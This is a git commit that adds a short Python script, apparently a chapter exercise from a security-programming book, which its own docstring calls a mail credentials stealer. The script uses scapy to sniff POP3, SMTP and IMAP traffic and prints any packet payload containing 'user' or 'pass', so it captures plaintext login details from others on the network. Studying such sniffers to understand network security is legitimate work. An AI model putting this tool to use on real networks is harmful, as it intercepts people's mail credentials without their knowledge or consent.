cbad6176a3b18caa38bb269ac0626b5724505d5a
aleksa <zabumaphu@gmail.com>
2023-05-22 20:43:42 -0400

    Mail Sniffing Done.

--- ch4/mail_sniffer.py
+++ ch4/mail_sniffer.py
@@ -3,3 +3,18 @@ Author: Aleksa Zatezalo
 Date: May 22th 2023
 Description: A mail credentials stealer coded in python.
 """
+
+from scapy.all import sniff, TCP, IP
+
+def packet_callback(packet):
+    if packet[TCP].payload:
+        mypacket = str(packet[TCP].payload)
+        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
+            print(f"[*] Destination: {packet[IP].dst}")
+            print(f"[*] {str(packet[TCP].payload)}")
+
+def main():
+    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, store=0)
+
+if __name__=='__main__':
+    main()
